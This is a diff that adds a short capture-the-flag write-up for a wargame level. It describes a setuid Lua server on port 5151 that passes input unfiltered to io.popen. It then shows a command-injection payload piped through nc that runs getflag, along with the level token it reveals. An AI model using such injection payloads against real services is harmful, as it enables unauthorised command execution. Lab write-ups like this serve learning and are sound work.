@@ -1,0 +1,15 @@
+
+for this level we have a suid lua script own by the user flag11
+that serve a local server on port 5151
+
+in the hash function input are executed without any filter
+	io.popen("echo "..pass.." | sha1sum", "r")
+
+so we can inject our command here like this
+
+$> echo '; getflag > /tmp/lv11 ; echo' | nc localhost 5151
+
+$> cat /tmp/lv11
+Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
+
+this token is the level12's password
